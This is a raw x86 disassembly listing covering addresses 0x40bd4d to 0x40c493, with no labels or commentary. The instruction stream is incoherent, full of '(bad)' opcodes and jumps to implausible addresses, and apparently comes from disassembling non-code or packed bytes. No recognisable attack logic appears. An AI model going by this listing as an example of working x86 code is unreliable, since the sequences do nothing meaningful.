  40bd4d:	cmp    BYTE PTR [edx-0x516f646],0x8e
  40bd54:	mov    ch,0xc3
  40bd56:	lods   eax,DWORD PTR ds:[esi]
  40bd57:	into   
  40bd58:	pushf  
  40bd59:	xor    BYTE PTR [esi-0x42],al
  40bd5c:	mov    cl,0x1e
  40bd5e:	lods   eax,DWORD PTR ds:[esi]
  40bd5f:	jno    0x40bd6a
  40bd61:	mov    ecx,0x5e78e45b
  40bd66:	inc    esi
  40bd67:	add    DWORD PTR [ecx+0x7b8e03e8],esi
  40bd6d:	mov    ecx,0x51111c46
  40bd72:	inc    ebx
  40bd73:	fs cmp al,0x3e
  40bd76:	pop    ebx
  40bd77:	xlat   BYTE PTR ds:[ebx]
  40bd78:	ins    BYTE PTR es:[edi],dx
  40bd79:	add    BYTE PTR [esi],dh
  40bd7b:	imul   DWORD PTR [edi]
  40bd7d:	add    DWORD PTR [edi-0x6400044e],esp
  40bd83:	clc    
  40bd84:	ret    0xdafb
  40bd87:	repnz cmp edi,0xf23bf716
  40bd8e:	aas    
  40bd8f:	sub    al,BYTE PTR [esi*2-0x44a08c4]
  40bd96:	(bad)  
  40bd97:	jbe    0x40bd9d
  40bd99:	call   0xff7d5781
  40bd9e:	mov    cs,WORD PTR [ecx+edx*2-0x29cd123e]
  40bda5:	mov    cl,ch
  40bda7:	mov    al,0x44
  40bda9:	cld    
  40bdaa:	inc    ebx
  40bdab:	xor    eax,0xce11af
  40bdb0:	out    0x3,al
  40bdb2:	call   0xff7c674c
  40bdb7:	jo     0x40bd7f
  40bdb9:	aas    
  40bdba:	push   0xbe2c32e9
  40bdbf:	inc    ecx
  40bdc0:	adc    esp,ecx
  40bdc2:	inc    eax
  40bdc3:	jmp    0x28999ed2
  40bdc8:	sub    eax,0x7ae1753c
  40bdcd:	xchg   esp,eax
  40bdce:	fmul   DWORD PTR [esi-0x7a8ac394]
  40bdd4:	je     0x40bd8c
  40bdd6:	pop    es
  40bdd7:	xchg   ecx,eax
  40bdd8:	(bad)  
  40bdd9:	ins    BYTE PTR es:[edi],dx
  40bdda:	push   DWORD PTR [esi-0x6]
  40bddd:	inc    esi
  40bdde:	add    al,0xe9
  40bde0:	xchg   DWORD PTR [esi+0x5cf168ec],ecx
  40bde6:	neg    DWORD PTR [esi-0x14]
  40bde9:	lea    eax,[ebp+0x55]
  40bdec:	in     eax,0x3a
  40bdee:	jne    0x40bdcd
  40bdf0:	in     eax,dx
  40bdf1:	cmc    
  40bdf2:	mov    ch,0x0
  40bdf4:	rol    BYTE PTR [esi-0x1],0xe7
  40bdf8:	jp     0x40bdaa
  40bdfa:	(bad)  
  40bdfb:	call   DWORD PTR [ebx-0x567af139]
  40be01:	pop    es
  40be02:	add    BYTE PTR [eax],al
  40be04:	pop    ds
  40be05:	jl     0x40bdfe
  40be07:	add    BYTE PTR [eax+0x7],bl
  40be0a:	add    bh,al
  40be0c:	(bad)  
  40be0d:	retf   
  40be0e:	inc    BYTE PTR [edi]
  40be10:	dec    eax
  40be11:	pop    es
  40be12:	push   0x0
  40be14:	add    BYTE PTR [edx-0x5dff95f9],ah
  40be1a:	pop    es
  40be1b:	lea    eax,[ebp+0x3c]
  40be1e:	ja     0x40bdac
  40be20:	test   DWORD PTR [esp+ecx*8],edi
  40be23:	(bad)  
  40be24:	jmp    FWORD PTR [eax-0x3c]
  40be27:	je     0x40be21
  40be29:	pop    es
  40be2a:	dec    esp
  40be2b:	sti    
  40be2c:	call   0x406e6d
  40be31:	adc    eax,edi
  40be33:	jae    0x40be3a
  40be35:	loope  0x40be91
  40be37:	add    BYTE PTR [eax],al
  40be39:	sbb    BYTE PTR [edi-0x6f],bl
  40be3c:	dec    eax
  40be3d:	dec    ecx
  40be3e:	add    eax,0xded475ff
  40be43:	test   BYTE PTR [edx-0x74b03a69],dh
  40be49:	test   al,0xb3
  40be4b:	test   ah,dh
  40be4d:	mov    edi,0x1a50fec5
  40be52:	fnsave [edx+esi*4-0x49]
  40be56:	lds    ecx,FWORD PTR [eax-0x132b77b]
  40be5c:	push   DWORD PTR [eax+0x47ffae01]
  40be62:	pusha  
  40be63:	jmp    DWORD PTR [edi-0x69]
  40be66:	outs   dx,DWORD PTR ds:[esi]
  40be67:	inc    eax
  40be68:	add    BYTE PTR [edi],al
  40be6a:	mov    esi,eax
  40be6c:	div    DWORD PTR [ecx]
  40be6e:	rol    DWORD PTR [ebx-0x1],cl
  40be71:	pop    esp
  40be72:	xchg   edx,eax
  40be73:	mov    ebx,0x37d83140
  40be78:	mov    cl,0x0
  40be7a:	xchg   bl,bh
  40be7c:	jns    0x40be03
  40be7e:	xchg   ebp,eax
  40be7f:	sti    
  40be80:	inc    ebx
  40be81:	dec    DWORD PTR [ebx]
  40be83:	xor    bl,bl
  40be85:	outs   dx,BYTE PTR ds:[esi]
  40be86:	or     BYTE PTR [ecx+0x3],dh
  40be89:	call   FWORD PTR [eax+eiz*1+0x135eff4c]
  40be90:	push   cs
  40be91:	mov    dh,0xe9
  40be93:	jo     0x40be98
  40be95:	call   0xff84c036
  40be9a:	mov    eax,0x3ef756a5
  40be9f:	xor    ebx,eax
  40bea1:	dec    esi
  40bea3:	mov    cl,0xa9
  40bea5:	inc    eax
  40bea6:	xor    DWORD PTR [ebx],esp
  40bea8:	jns    0x40be9a
  40beaa:	push   ds
  40beab:	pop    ebx
  40beac:	inc    ebx
  40bead:	jmp    DWORD PTR [edx+ebx*4-0x34]
  40beb1:	inc    eax
  40beb2:	xor    DWORD PTR [eax-0x6d],ecx
  40beb5:	mov    cl,0xe
  40beb7:	inc    ebx
  40beb8:	lea    eax,[ebp-0xbc8ce7]
  40bebe:	lods   al,BYTE PTR ds:[esi]
  40bebf:	lods   al,BYTE PTR ds:[esi]
  40bec0:	pop    edi
  40bec1:	div    esi
  40bec3:	push   0xffffffd4
  40bec5:	addr16 mov ecx,0xe7ffc4c8
  40becb:	aam    0x33
  40becd:	neg    esi
  40becf:	xchg   edx,eax
  40bed0:	inc    ebx
  40bed1:	xor    eax,0xffc4e79f
  40bed6:	(bad)  
  40bed7:	adc    esi,DWORD PTR [ebp-0x1]
  40beda:	(bad)  
  40bedb:	ss inc ebx
  40bedd:	je     0x40bedf
  40bedf:	sbb    BYTE PTR [edi-0x55412380],ch
  40bee5:	inc    edx
  40bee6:	add    al,0x24
  40bee8:	or     ecx,edi
  40beea:	inc    edx
  40beeb:	popa   
  40beec:	mov    ah,BYTE PTR [esp-0x5a]
  40bef0:	cmp    DWORD PTR [esi-0x2c],edx
  40bef3:	mov    ?,edi
  40bef5:	jle    0x40bf3a
  40bef7:	mov    gs,WORD PTR ds:0xb4710edd
  40befd:	out    0xd3,al
  40beff:	xchg   esi,eax
  40bf00:	jmp    0x40be88
  40bf02:	inc    ebx
  40bf03:	jbe    0x40bf46
  40bf05:	fs and al,0x66
  40bf08:	cmp    DWORD PTR [esi],esp
  40bf0a:	sbb    DWORD PTR [ecx],esi
  40bf0c:	or     ecx,ebp
  40bf0e:	xchg   BYTE PTR [esp+0x856431e],bl
  40bf15:	xchg   ebp,eax
  40bf16:	fidiv  DWORD PTR [ebx+0x463b157b]
  40bf1c:	cmp    ecx,ebp
  40bf1e:	mov    bh,0xec
  40bf20:	test   DWORD PTR [esp+ebp*1],esi
  40bf23:	ds cmp esi,ebp
  40bf26:	add    esp,DWORD PTR [ebp+0x310450ce]
  40bf2c:	sub    BYTE PTR [edi-0x3efe5bbe],bl
  40bf32:	outs   dx,DWORD PTR ds:[esi]
  40bf33:	retf   
  40bf34:	cmp    dh,cl
  40bf36:	inc    edx
  40bf37:	les    esp,FWORD PTR ds:0x390642be
  40bf3d:	xor    al,0xc
  40bf3f:	or     DWORD PTR [edx],ecx
  40bf41:	add    BYTE PTR [edx+0x0],0xf6
  40bf45:	cmp    BYTE PTR [ebx+ebp*1-0x1a],dh
  40bf49:	cmp    BYTE PTR [esi-0x6efea3be],ah
  40bf4f:	xor    eax,0x4296388b
  40bf54:	pushf  
  40bf55:	sub    eax,0x38ce4296
  40bf5a:	cld    
  40bf5b:	or     ebx,ecx
  40bf5d:	sub    eax,0x38be4253
  40bf62:	add    BYTE PTR [edx+edx*1],bh
  40bf65:	inc    eax
  40bf66:	jmp    FWORD PTR [esi-0xd]
  40bf69:	mov    ebp,0x62de5107
  40bf6e:	call   FWORD PTR [esi-0xd]
  40bf71:	jge    0x40bf57
  40bf73:	pop    esi
  40bf74:	repz aaa 
  40bf76:	call   0xff78c10c
  40bf7b:	inc    esi
  40bf7c:	or     DWORD PTR ds:0x20f33ef7,esp
  40bf82:	lods   eax,DWORD PTR ds:[esi]
  40bf83:	test   bl,dh
  40bf85:	aaa    
  40bf86:	push   DWORD PTR [edx+ebx*1+0x40]
  40bf8a:	jmp    DWORD PTR [esi]
  40bf8c:	sbb    ch,BYTE PTR [ebx-0x53]
  40bf8f:	push   ds
  40bf90:	repz aaa 
  40bf92:	mov    ch,0x19
  40bf94:	sbb    edi,DWORD PTR [eax]
  40bf96:	inc    DWORD PTR [ecx]
  40bf98:	stos   DWORD PTR es:[edi],eax
  40bf99:	inc    WORD PTR [esi]
  40bf9c:	repz int 0xf7
  40bf9f:	adc    BYTE PTR [eax-0xf0900ca],al
  40bfa5:	mov    ebp,0xa70001fb
  40bfaa:	xchg   edx,eax
  40bfab:	add    cl,ch
  40bfad:	jnp    0x40bffa
  40bfaf:	or     cl,ch
  40bfb1:	pop    es
  40bfb2:	sub    esp,0x6a
  40bfb5:	imul   esi,DWORD PTR ds:0x1adce96a,0x21353cff
  40bfbf:	test   eax,0x89387093
  40bfc4:	sub    al,0x71
  40bfc6:	mov    eax,ds:0x37f2108f
  40bfcb:	(bad)  
  40bfcc:	sbb    al,0x35
  40bfce:	and    DWORD PTR [esi],edx
  40bfd0:	lahf   
  40bfd1:	jo     0x40c00b
  40bfd3:	call   FWORD PTR [ecx+esi*2]
  40bfd6:	cmp    BYTE PTR [ebp-0x1f],dh
  40bfd9:	sbb    bl,BYTE PTR [ebp-0x56]
  40bfdc:	add    BYTE PTR [edi-0x2b3d3737],ch
  40bfe2:	or     edx,DWORD PTR [ebp-0x75]
  40bfe5:	lods   al,BYTE PTR ds:[esi]
  40bfe6:	(bad)  
  40bfe7:	(bad)  
  40bfe8:	cld    
  40bfe9:	xor    cl,BYTE PTR ds:0x800f146a
  40bfef:	pop    es
  40bff0:	call   0x3f6585
  40bff5:	adc    DWORD PTR [eax-0x5],edx
  40bff8:	push   0xbeef0b98
  40bffd:	pusha  
  40bffe:	mov    ch,0x58
  40c000:	inc    ecx
  40c001:	mov    BYTE PTR [ebx-0x51],ah
  40c004:	pop    ecx
  40c005:	leave  
  40c006:	or     edi,edi
  40c008:	jne    0x40c05a
  40c00a:	jecxz  0x40c06e
  40c00c:	(bad)  
  40c00d:	add    BYTE PTR [edi],cl
  40c00f:	retf   0x75fe
  40c012:	cmp    al,0xca
  40c014:	je     0x40c01e
  40c016:	xor    BYTE PTR [edx+ebp*4-0x3e3bc001],dl
  40c01d:	add    al,0x58
  40c01f:	pop    esi
  40c020:	mov    ch,ah
  40c022:	leave  
  40c023:	rcl    bh,0xf7
  40c026:	aas    
  40c027:	enter  0x458c,0x1c
  40c02b:	pop    ebx
  40c02c:	(bad)  
  40c02d:	jne    0x40c04b
  40c02f:	retf   0xb634
  40c032:	pusha  
  40c033:	dec    edx
  40c034:	jmp    edi
  40c036:	cs xchg edx,eax
  40c038:	add    BYTE PTR [eax],al
  40c03a:	adc    ecx,ebx
  40c03c:	push   cs
  40c03d:	test   DWORD PTR [ebp-0x28fffff5],edi
  40c043:	dec    edi
  40c044:	test   DWORD PTR [eax],0xc7000b08
  40c04a:	adc    eax,0xd807fef1
  40c04f:	or     ch,BYTE PTR [edx+0x0]
  40c052:	inc    edx
  40c053:	or     eax,0xa31006a
  40c058:	add    al,0x8d
  40c05a:	je     0x40bff8
  40c05c:	ror    DWORD PTR [esp+ebp*4-0x4100c84c],cl
  40c063:	adc    BYTE PTR [ecx+0x75],al
  40c066:	mov    ecx,0x99fbb5bf
  40c06b:	and    BYTE PTR [edx+0x433b3100],bl
  40c071:	je     0x40c073
  40c073:	xor    al,0xd9
  40c075:	xchg   edx,eax
  40c076:	add    DWORD PTR [ecx],esi
  40c078:	and    BYTE PTR [ebx+0x360f991],ch
  40c07e:	(bad)  
  40c07f:	cld    
  40c080:	cmp    ebp,DWORD PTR [ebx]
  40c082:	push   ecx
  40c083:	shl    edi,0x3f
  40c086:	push   eax
  40c087:	stos   BYTE PTR es:[edi],al
  40c088:	adc    BYTE PTR [esi+0x3fff6585],cl
  40c08e:	inc    DWORD PTR [ecx]
  40c090:	jb     0x40c0bd
  40c092:	inc    ecx
  40c093:	mov    eax,ds:0xac894017
  40c098:	adc    BYTE PTR [eax],bh
  40c09a:	dec    DWORD PTR [esi+0x8]
  40c09d:	cwde   
  40c09e:	lods   al,BYTE PTR ds:[esi]
  40c09f:	inc    esi
  40c0a0:	jle    0x3f801a2b
  40c0a6:	jmp    ecx
  40c0a8:	xchg   DWORD PTR [ebx+0x59],ebx
  40c0ab:	jo     0x40c0cd
  40c0ad:	inc    eax
  40c0ae:	mov    ch,0x21
  40c0b0:	push   edi
  40c0b1:	aas    
  40c0b2:	call   FWORD PTR [esi]
  40c0b4:	sbb    eax,0x20704876
  40c0b9:	sub    edx,DWORD PTR [edx-0x76c0b922]
  40c0bf:	lods   al,BYTE PTR ds:[esi]
  40c0c0:	inc    ebx
  40c0c1:	aaa    
  40c0c2:	(bad)  
  40c0c3:	(bad)  
  40c0c4:	fld    DWORD PTR [ebx]
  40c0c6:	push   0xffc518ef
  40c0cb:	out    dx,eax
  40c0cc:	mov    esp,0x8e6f733
  40c0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d2:	aas    
  40c0d3:	and    al,0x7f
  40c0d5:	xor    ebp,eax
  40c0d7:	add    dh,dl
  40c0d9:	sub    eax,0x35ce6f1d
  40c0de:	pusha  
  40c0df:	mov    ebp,edx
  40c0e1:	cmp    eax,0x94b3f86
  40c0e6:	adc    DWORD PTR [edi+0x58],ecx
  40c0e9:	enter  0x3ee8,0xe4
  40c0ed:	cmp    BYTE PTR [esi+0x3f],dh
  40c0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0f1:	xor    eax,0xc7e9761c
  40c0f6:	call   0x56a6c026
  40c0fb:	aas    
  40c0fc:	mov    eax,0x8637418b
  40c101:	xor    eax,0x3d5d8974
  40c106:	ds aas 
  40c108:	loope  0x40c0aa
  40c10a:	inc    edi
  40c10b:	(bad)  
  40c10d:	or     BYTE PTR [esi],ch
  40c10f:	jns    0x40c172
  40c111:	cmp    eax,0xfb5e3f26
  40c116:	push   esi
  40c117:	int3   
  40c118:	icebp  
  40c119:	or     BYTE PTR [ecx],al
  40c11b:	repz lahf 
  40c11d:	xor    eax,0xbc710b0e
  40c122:	fild   WORD PTR [edx+0x3ef6547c]
  40c128:	ss or  al,0x7c
  40c12b:	adc    ebp,DWORD PTR [esi]
  40c12d:	cli    
  40c12e:	pop    ebp
  40c12f:	mov    DWORD PTR [ecx],edx
  40c131:	cmp    eax,0x21813ee6
  40c136:	jmp    0xc275d7aa
  40c13b:	pop    ss
  40c13c:	add    BYTE PTR [edx],bh
  40c13e:	dec    ecx
  40c13f:	push   ebp
  40c140:	push   es
  40c141:	popa   
  40c142:	and    DWORD PTR [ebp-0x59cb0196],edi
  40c148:	mov    BYTE PTR [ecx],dl
  40c14a:	cmp    eax,0x1e2fb600
  40c14f:	add    cl,ch
  40c151:	xor    cl,BYTE PTR [eax+0x34278dbd]
  40c157:	(bad)  
  40c158:	jmp    0x54c377fb
  40c15d:	push   ds
  40c15e:	cmp    al,0xff
  40c160:	mov    ?,WORD PTR [edx]
  40c162:	mov    ebp,0x21b16a74
  40c167:	idiv   DWORD PTR [esi-0x9]
  40c16a:	or     BYTE PTR [ebp+eax*1-0x25],dh
  40c16e:	xor    al,0x8c
  40c170:	or     bh,BYTE PTR fs:[edi+edi*8]
  40c174:	data16 xor BYTE PTR [ebx],0xb5
  40c178:	inc    ebp
  40c179:	pop    edi
  40c17a:	xor    al,0xff
  40c17c:	inc    ecx
  40c17d:	mov    bl,BYTE PTR [ebp-0x1]
  40c180:	dec    esi
  40c181:	cmp    ecx,DWORD PTR [ecx+0x74]
  40c184:	popf   
  40c185:	mov    bl,0x76
  40c187:	fdiv   DWORD PTR [esi]
  40c189:	aaa    
  40c18a:	xor    al,0x0
  40c18c:	mov    ebp,0xe8ffac7b
  40c191:	pop    ss
  40c192:	jae    0x40c193
  40c194:	pushf  
  40c195:	sub    ah,BYTE PTR [ecx]
  40c197:	push   edx
  40c198:	push   ecx
  40c199:	pop    ss
  40c19a:	xor    al,0xff
  40c19c:	pop    esp
  40c19d:	push   ds
  40c19e:	cmp    al,0xff
  40c1a0:	push   cs
  40c1a1:	add    BYTE PTR [edi],al
  40c1a3:	mov    esi,0x60d41107
  40c1a8:	(bad)  
  40c1a9:	(bad)  
  40c1aa:	hlt    
  40c1ab:	jge    0x40c195
  40c1ad:	(bad)  
  40c1ae:	ins    BYTE PTR es:[edi],dx
  40c1af:	xor    al,0xff
  40c1b1:	je     0x40c1ed
  40c1b3:	and    DWORD PTR [eax-0xcba36f],ebx
  40c1b9:	xchg   esp,eax
  40c1ba:	jne    0x40c1f8
  40c1bc:	call   esi
  40c1be:	dec    esp
  40c1bf:	jle    0x40c1a5
  40c1c1:	(bad)  
  40c1c2:	inc    esp
  40c1c3:	xor    al,0xff
  40c1c5:	add    BYTE PTR ds:0xa058e805,bh
  40c1cb:	cmc    
  40c1cc:	(bad)  
  40c1cd:	jmp    FWORD PTR [ebp-0x13]
  40c1d0:	idiv   bh
  40c1d2:	xchg   edi,eax
  40c1d3:	cmc    
  40c1d4:	je     0x40c1de
  40c1d6:	rcl    BYTE PTR [eax],0xa8
  40c1d9:	push   DWORD PTR [edi-0x501b4b0b]
  40c1df:	cmc    
  40c1e0:	(bad)  
  40c1e1:	call   0x3f63e6
  40c1e6:	mov    bh,0xbb
  40c1e8:	jmp    0x40c1e1
  40c1ea:	aaa    
  40c1eb:	mul    bh
  40c1ed:	dec    ebp
  40c1ee:	repz cmc 
  40c1f0:	(bad)  
  40c1f1:	call   FWORD PTR [ebp-0x1b]
  40c1f4:	idiv   bh
  40c1f6:	pop    ss
  40c1f7:	in     eax,0x41
  40c1f9:	stos   DWORD PTR es:[edi],eax
  40c1fa:	div    ebp
  40c1fc:	(bad)  
  40c1fd:	mov    ch,0xe8
  40c1ff:	std    
  40c200:	(bad)  
  40c201:	push   eax
  40c203:	cmp    eax,0xf700ffaa
  40c208:	cmc    
  40c209:	inc    esp
  40c20a:	clc    
  40c20b:	loope  0x40c253
  40c20d:	std    
  40c20e:	jmp    DWORD PTR [edi]
  40c210:	div    BYTE PTR [esp+edi*8-0x10]
  40c214:	pop    ecx
  40c215:	xchg   esi,eax
  40c216:	add    BYTE PTR [eax-0x42],cl
  40c219:	ror    DWORD PTR [eax],0x48
  40c21c:	pop    edx
  40c21d:	mov    ch,ah
  40c21f:	fcmovnb st,st(0)
  40c221:	repz call FWORD PTR [ebp-0x221417fd]
  40c228:	or     al,0x0
  40c22a:	mov    DWORD PTR [ebp+0x2075feef],ecx
  40c230:	fbld   TBYTE PTR [eax]
  40c232:	stos   DWORD PTR es:[edi],eax
  40c233:	pop    ss
  40c234:	test   BYTE PTR [eax+0x74f61445],0xfc
  40c23b:	idiv   DWORD PTR [ebx-0x9]
  40c23e:	push   DWORD PTR [ecx]
  40c240:	aad    0xf
  40c242:	call   0xff7d5d8f
  40c247:	sub    ah,BYTE PTR [eax-0x49]
  40c24a:	cmp    eax,0x6a37eda8
  40c24f:	xor    DWORD PTR [ebp+0x6381f3c5],ebp
  40c255:	mov    dh,0xfb
  40c257:	leave  
  40c258:	add    DWORD PTR [eax-0x1],ebx
  40c25b:	(bad)  
  40c25c:	aaa    
  40c25d:	inc    ebx
  40c25e:	je     0x40c278
  40c260:	or     BYTE PTR [eax+edx*1],al
  40c263:	(bad)  
  40c264:	ret    0x753b
  40c267:	sub    DWORD PTR [eax-0x49ff5879],ebx
  40c26d:	mov    bl,0x3b
  40c26f:	jne    0x40c21a
  40c271:	mov    ebx,0x3da60bb5
  40c276:	or     ebp,eax
  40c278:	int    0x83
  40c27a:	cmp    al,0xff
  40c27c:	xchg   esi,eax
  40c27d:	pop    ebp
  40c27e:	aaa    
  40c27f:	inc    DWORD PTR [esp+ebx*8]
  40c282:	cmp    esi,DWORD PTR [ebp+0x39]
  40c285:	enter  0xa79c,0x7e
  40c289:	retf   
  40c28a:	cmp    esi,DWORD PTR [ebp+0x75]
  40c28d:	fsubr  DWORD PTR [ebx-0x56]
  40c290:	outs   dx,BYTE PTR ds:[esi]
  40c291:	sti    
  40c292:	dec    ecx
  40c293:	ret    0x2039
  40c296:	(bad)  
  40c297:	mov    cl,BYTE PTR [ebp-0x61]
  40c29a:	inc    esi
  40c29b:	call   0xbf6d59f
  40c2a0:	pop    ecx
  40c2a1:	cdq    
  40c2a2:	ins    BYTE PTR es:[edi],dx
  40c2a3:	inc    DWORD PTR [esi+0x27]
  40c2a6:	inc    ebx
  40c2a7:	jne    0x40c2dd
  40c2a9:	push   0x4a
  40c2ab:	ret    0x2029
  40c2ae:	mov    es,WORD PTR [ebp+0x21]
  40c2b1:	nop
  40c2b2:	cmp    al,0x75
  40c2b4:	xor    eax,0x1eafe808
  40c2b9:	or     esi,esp
  40c2bb:	psllw  mm0,QWORD PTR [ecx]
  40c2be:	gs sahf 
  40c2c0:	xor    DWORD PTR [ecx],ecx
  40c2c2:	jmp    0xc1763f01
  40c2c7:	mov    cl,bl
  40c2c9:	xor    esi,eax
  40c2cb:	lea    ebp,[ebp+eiz*1-0x42]
  40c2cf:	mov    cl,0x0
  40c2d1:	jmp    0xb0bb:0xe6283c31
  40c2d8:	sub    al,0xa5
  40c2da:	pop    esi
  40c2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2dc:	cmp    ebp,DWORD PTR [edx+0x782f8cbb]
  40c2e2:	mov    eax,ds:0x971ddf2
  40c2e7:	aaa    
  40c2e8:	sub    al,0xdd
  40c2ea:	call   0x5f4:0x492a03e9
  40c2f1:	call   0x130f:0x193461f3
  40c2f8:	lds    ebx,FWORD PTR [esi+0x31910329]
  40c2fe:	or     edx,ebp
  40c300:	xor    edi,DWORD PTR [eax+0x59ac40bb]
  40c306:	iret   
  40c307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c308:	add    esp,edi
  40c30a:	and    BYTE PTR [ebx-0xdf6ce6e],al
  40c310:	inc    ebx
  40c311:	in     al,0x6
  40c313:	inc    edx
  40c314:	pop    ds
  40c315:	mov    ebx,0x31042718
  40c31a:	fnstcw WORD PTR [edx+0x1e20dc3a]
  40c320:	mov    cl,0x36
  40c322:	and    DWORD PTR [eax],edx
  40c324:	cmp    al,BYTE PTR [esi+0x31]
  40c327:	mov    bl,0xdb
  40c329:	mov    dh,0x18
  40c32b:	imul   edi,edx,0xac3abc36
  40c331:	xor    DWORD PTR [ecx],ebx
  40c333:	add    BYTE PTR [esi],al
  40c335:	add    BYTE PTR [ebx+0x4ae17530],ch
  40c33b:	js     0x40c2e3
  40c33d:	out    0x5b,al
  40c33f:	xor    BYTE PTR [ebp-0x23],dh
  40c342:	dec    ebx
  40c343:	mov    dh,0xeb
  40c345:	(bad)  
  40c346:	ror    DWORD PTR [eax],0xe8
  40c349:	scas   al,BYTE PTR es:[edi]
  40c34a:	nop
  40c34b:	xor    bh,bh
  40c34d:	mov    cl,0x24
  40c350:	call   0xff71210e
  40c355:	fs icebp 
  40c357:	and    BYTE PTR [eax-0x3f],dl
  40c35a:	cmp    edi,DWORD PTR [ecx-0x1]
  40c35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c35e:	pop    es
  40c35f:	or     DWORD PTR [esi-0x50],ebx
  40c362:	je     0x40c365
  40c364:	add    BYTE PTR [esi+esi*4],bh
  40c367:	sbb    eax,0xa306a583
  40c36c:	call   DWORD PTR [edx]
  40c36e:	and    BYTE PTR [eax],dh
  40c370:	jne    0x40c363
  40c372:	pop    edx
  40c373:	pop    es
  40c374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c375:	jbe    0x40c3e2
  40c377:	add    BYTE PTR [ebp+0x6d],0xca
  40c37b:	es pop ecx
  40c37d:	test   al,0x32
  40c37f:	xor    BYTE PTR [ebp-0xf],dh
  40c382:	pop    edx
  40c383:	push   0xa34b56fc
  40c388:	inc    eax
  40c38a:	jb     0x40c35e
  40c38c:	inc    eax
  40c38d:	jmp    0xa89aa85c
  40c392:	xor    dh,BYTE PTR [eax]
  40c394:	xor    eax,0xffc97a7f
  40c399:	inc    eax
  40c39a:	add    bl,bl
  40c39c:	pop    esp
  40c39d:	jmp    DWORD PTR [esi]
  40c39f:	daa    
  40c3a0:	dec    ecx
  40c3a1:	je     0x40c3a6
  40c3a3:	popf   
  40c3a4:	call   FWORD PTR [ecx-0x58]
  40c3a7:	xor    bl,cl
  40c3a9:	out    0x62,eax
  40c3ab:	leave  
  40c3ac:	das    
  40c3ad:	inc    DWORD PTR [eax]
  40c3af:	cwde   
  40c3b0:	pop    esp
  40c3b1:	(bad)  
  40c3b2:	jne    0x40c3d4
  40c3b4:	in     al,0xe2
  40c3b6:	(bad)  
  40c3b7:	pop    ds
  40c3b8:	repnz out 0x89,eax
  40c3bb:	jno    0x40c3b0
  40c3bd:	(bad)  
  40c3be:	push   0x32
  40c3c0:	fstp   st(1)
  40c3c2:	lods   eax,DWORD PTR ds:[esi]
  40c3c3:	out    dx,eax
  40c3c4:	icebp  
  40c3c5:	or     al,al
  40c3c7:	fs push eax
  40c3c9:	add    eax,DWORD PTR [bp+si+0x4c]
  40c3cd:	dec    DWORD PTR [edi-0x20]
  40c3d0:	push   0xffffffac
  40c3d2:	jmp    FWORD PTR [edi+0x195a0e5c]
  40c3d8:	add    eax,0xa843e850
  40c3dd:	(bad)  
  40c3de:	call   FWORD PTR [eax]
  40c3e0:	push   ebp
  40c3e1:	(bad)  
  40c3e2:	jne    0x40c3a4
  40c3e4:	jecxz  0x40c398
  40c3e6:	(bad)  
  40c3e7:	lahf   
  40c3e8:	icebp  
  40c3e9:	out    0x59,eax
  40c3eb:	jno    0x40c3df
  40c3ed:	(bad)  
  40c3ee:	push   0xffffffcc
  40c3f0:	jecxz  0x40c39b
  40c3f2:	lods   eax,DWORD PTR ds:[esi]
  40c3f3:	das    
  40c3f4:	repnz or al,al
  40c3f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3f8:	dec    esi
  40c3f9:	add    eax,DWORD PTR [bp+si+0x4c]
  40c3fd:	dec    DWORD PTR [edi+0x0]
  40c400:	add    BYTE PTR [ebx],bh
  40c402:	lods   al,BYTE PTR ds:[esi]
  40c403:	(bad)  
  40c404:	out    dx,eax
  40c405:	pop    esp
  40c406:	push   cs
  40c407:	pop    edx
  40c408:	(bad)  [ebx]
  40c40a:	push   eax
  40c40b:	call   0x3f6c43
  40c410:	cwde   
  40c411:	pop    ebx
  40c412:	(bad)  
  40c413:	jne    0x40c475
  40c415:	jecxz  0x40c399
  40c417:	(bad)  
  40c418:	pop    ds
  40c419:	repnz out 0x29,eax
  40c41c:	mov    cl,0xf1
  40c41e:	(bad)  
  40c41f:	push   0x6b
  40c421:	jecxz  0x40c49c
  40c423:	lods   eax,DWORD PTR ds:[esi]
  40c424:	das    
  40c425:	repnz or al,al
  40c428:	xor    DWORD PTR [esi+0x7c3267de],ecx
  40c42e:	ret    0xe6ff
  40c431:	sbb    DWORD PTR [edx],eax
  40c433:	lods   eax,DWORD PTR ds:[esi]
  40c434:	xor    BYTE PTR cs:[ebx+0x3618b0e],ch
  40c43b:	push   eax
  40c43c:	or     DWORD PTR [edi+eiz*2],edi
  40c43f:	call   DWORD PTR [esi]
  40c441:	icebp  
  40c442:	sar    esi,cl
  40c444:	test   BYTE PTR [eax],bh
  40c446:	sub    edx,DWORD PTR [ebx+0x7]
  40c449:	pop    eax
  40c44a:	cmp    al,ch
  40c44c:	clc    
  40c44d:	mov    BYTE PTR [eax],bh
  40c44f:	push   esi
  40c451:	in     eax,dx
  40c452:	aaa    
  40c453:	jmp    DWORD PTR [eax+edi*1+0x2b]
  40c457:	ins    BYTE PTR es:[edi],dx
  40c458:	(bad)  
  40c459:	ja     0x40c493
  40c45b:	leave  
  40c45c:	repz and al,0x3
  40c45f:	push   ebp
  40c460:	stos   BYTE PTR es:[edi],al
  40c461:	xchg   esp,eax
  40c462:	add    ah,0x0
  40c465:	in     eax,dx
  40c466:	xchg   edi,eax
  40c467:	cmp    bh,bh
  40c469:	mov    ah,0xdd
  40c46b:	aaa    
  40c46c:	push   eax
  40c46d:	mov    esi,0x3cff1415
  40c472:	xor    al,0x2b
  40c474:	add    al,0xc4
  40c476:	and    BYTE PTR [ebx],al
  40c478:	or     esi,DWORD PTR [ecx+0x27]
  40c47b:	jle    0x40c43b
  40c47d:	xor    BYTE PTR [eax],ah
  40c47f:	add    eax,edi
  40c481:	in     al,dx
  40c482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c483:	add    al,BYTE PTR [eax]
  40c485:	xor    DWORD PTR [eax],esp
  40c487:	inc    eax
  40c488:	inc    ebp
  40c489:	jge    0x40c462
  40c48b:	(bad)  
  40c48c:	push   DWORD PTR [ecx]
  40c48e:	dec    edx
  40c48f:	add    ebp,DWORD PTR [edx+0x31]
  40c492:	pop    edx
  40c493:	add    ebp,DWORD PTR [edx+0x31]
